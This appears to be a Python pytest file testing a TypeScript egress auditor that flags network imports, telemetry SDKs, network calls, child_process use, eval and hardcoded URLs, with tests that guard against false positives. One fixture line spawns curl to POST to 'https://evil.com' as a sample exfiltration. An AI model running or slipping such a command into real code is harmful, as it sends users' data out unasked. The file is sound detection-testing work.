"""TypeScript egress detection (.ts/.tsx/.mts/.cts).

The tests that matter most here are the NEGATIVE ones. A checker that flags
every URL in a licence header is not a strict checker, it is an unusable one --
that failure mode is why .ts was given a source-aware path instead of being
added to the HTML regex list.
"""

import tempfile
from pathlib import Path

import pytest

from entrovouch.no_egress_auditor import audit, _strip_js_comments


def _audit_src(src: str, name: str = "target.ts"):
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)
        (d / name).write_text(src, encoding="utf-8")
        return audit(d)


def kinds(rep):
    return {f["kind"] for f in rep.findings}


# ── the file type is actually scanned ──────────────────────────────────

@pytest.mark.parametrize("ext", [".ts", ".tsx", ".mts", ".cts"])
def test_ts_family_is_scanned(ext):
    rep = _audit_src("const x: number = 1;\n", name=f"a{ext}")
    assert rep.files_scanned == 1


def test_ts_was_previously_invisible():
    """Regression guard: a TS file with an obvious egress must not audit CLEAN."""
    rep = _audit_src("import axios from 'axios';\nawait axios.get('https://x.com');\n")
    assert rep.verdict == "FINDINGS"


# ── true positives ─────────────────────────────────────────────────────

def test_detects_http_client_import():
    rep = _audit_src("import axios from 'axios';\n")
    assert "network-import" in kinds(rep)


def test_detects_node_builtin_network_import():
    rep = _audit_src("import * as https from 'node:https';\n")
    assert "network-import" in kinds(rep)


def test_detects_require_form():
    rep = _audit_src("const got = require('got');\n")
    assert "network-import" in kinds(rep)


def test_detects_dynamic_import():
    rep = _audit_src("const m = await import('node-fetch');\n")
    assert "network-import" in kinds(rep)


def test_detects_export_from_form():
    rep = _audit_src("export { default } from 'axios';\n")
    assert "network-import" in kinds(rep)


@pytest.mark.parametrize("pkg", [
    "@sentry/node", "posthog-js", "@datadog/browser-rum", "mixpanel",
    "@segment/analytics-next", "@opentelemetry/api", "rollbar",
])
def test_detects_telemetry_sdks(pkg):
    """The category the Python auditor misses entirely — covered here."""
    rep = _audit_src(f"import t from '{pkg}';\n")
    assert "network-import" in kinds(rep), f"{pkg} not flagged"


@pytest.mark.parametrize("pkg", ["aws-sdk", "@aws-sdk/client-s3", "@google-cloud/storage", "firebase"])
def test_detects_cloud_sdks(pkg):
    rep = _audit_src(f"import c from '{pkg}';\n")
    assert "network-import" in kinds(rep)


@pytest.mark.parametrize("expr", [
    "fetch('/api')", "new WebSocket('wss://x')", "new EventSource('/s')",
    "navigator.sendBeacon('/b', d)", "axios.post('/p', {})",
    "https.get('/g')", "net.connect(80)", "$.ajax({})",
    "new XMLHttpRequest()",
])
def test_detects_network_call_expressions(expr):
    rep = _audit_src(f"const r = {expr};\n")
    assert "network-call" in kinds(rep), f"{expr} not flagged"


def test_detects_child_process_import():
    """The JS analogue of the Python subprocess gap."""
    rep = _audit_src("import { exec } from 'child_process';\n")
    assert "subprocess-shell" in kinds(rep)


def test_detects_child_process_network_binary():
    """The exact case the Python auditor misses: argv-list curl, no shell."""
    rep = _audit_src("spawn('curl', ['-X','POST','https://evil.com']);\n")
    assert "subprocess-shell" in kinds(rep)
    detail = " ".join(f["detail"] for f in rep.findings)
    assert "network binary" in detail


def test_detects_dynamic_exec():
    rep = _audit_src("eval(userInput);\n")
    assert "dynamic-exec" in kinds(rep)
    rep2 = _audit_src("const f = new Function('return 1');\n")
    assert "dynamic-exec" in kinds(rep2)


def test_detects_url_in_string_literal():
    """A hardcoded endpoint in a string IS evidence — strings are preserved."""
    rep = _audit_src("const API = 'https://api.example.com/v1';\n")
    assert "external-url" in kinds(rep)


# ── the negative tests: usability on real TypeScript ───────────────────

def test_clean_typescript_is_clean():
    src = (
        "interface User { id: number; name: string }\n"
        "export function greet(u: User): string {\n"
        "  return `hello ${u.name}`;\n"
        "}\n"
    )
    rep = _audit_src(src)
    assert rep.verdict == "CLEAN", f"false positives: {rep.findings}"


def test_url_in_line_comment_is_not_a_finding():
    """The failure that would have made this unusable on any real repo."""
    rep = _audit_src("// see https://developer.mozilla.org/docs\nconst x = 1;\n")
    assert rep.verdict == "CLEAN", f"comment URL flagged: {rep.findings}"


def test_url_in_block_comment_is_not_a_finding():
    src = (
        "/**\n"
        " * Docs: https://example.com/guide\n"
        " * @see https://example.com/api\n"
        " */\n"
        "export const VERSION = 1;\n"
    )
    rep = _audit_src(src)
    assert rep.verdict == "CLEAN", f"JSDoc URLs flagged: {rep.findings}"


def test_licence_header_is_not_a_finding():
    src = (
        "/* Licensed under Apache-2.0\n"
        "   http://www.apache.org/licenses/LICENSE-2.0 */\n"
        "export const x = 1;\n"
    )
    rep = _audit_src(src)
    assert rep.verdict == "CLEAN", f"licence header flagged: {rep.findings}"


def test_relative_imports_are_not_network():
    src = "import { a } from './local';\nimport { b } from '../lib/util';\n"
    rep = _audit_src(src)
    assert rep.verdict == "CLEAN", f"relative imports flagged: {rep.findings}"


def test_non_network_package_is_not_flagged():
    src = "import React from 'react';\nimport { z } from 'zod';\n"
    rep = _audit_src(src)
    assert rep.verdict == "CLEAN", f"benign packages flagged: {rep.findings}"


def test_word_containing_fetch_is_not_a_call():
    """`prefetchData(` must not match the fetch( pattern."""
    rep = _audit_src("prefetchData();\nconst refetching = 1;\n")
    assert rep.verdict == "CLEAN", f"substring false positive: {rep.findings}"


# ── comment stripper ───────────────────────────────────────────────────

def test_strip_preserves_line_numbers():
    src = "// a\n/* b\n c */\nconst x = 1;\n"
    assert _strip_js_comments(src).count("\n") == src.count("\n")


def test_strip_preserves_string_contents():
    src = "const u = 'https://x.com';\n"
    assert "https://x.com" in _strip_js_comments(src)


def test_strip_removes_comment_contents():
    src = "// https://secret.example\nconst x = 1;\n"
    assert "secret.example" not in _strip_js_comments(src)


def test_line_numbers_are_accurate():
    src = "// pad\n// pad\nimport axios from 'axios';\n"
    rep = _audit_src(src)
    assert any(f["line"] == 3 for f in rep.findings), rep.findings


# ── existing behaviour must not shift ──────────────────────────────────

def test_python_path_unchanged():
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)
        (d / "m.py").write_text("import requests\n", encoding="utf-8")
        rep = audit(d)
    assert rep.verdict == "FINDINGS"
    assert "network-import" in kinds(rep)


def test_clean_python_still_clean():
    with tempfile.TemporaryDirectory() as td:
        d = Path(td)
        (d / "m.py").write_text("import json\nprint(json.dumps({}))\n", encoding="utf-8")
        rep = audit(d)
    assert rep.verdict == "CLEAN"
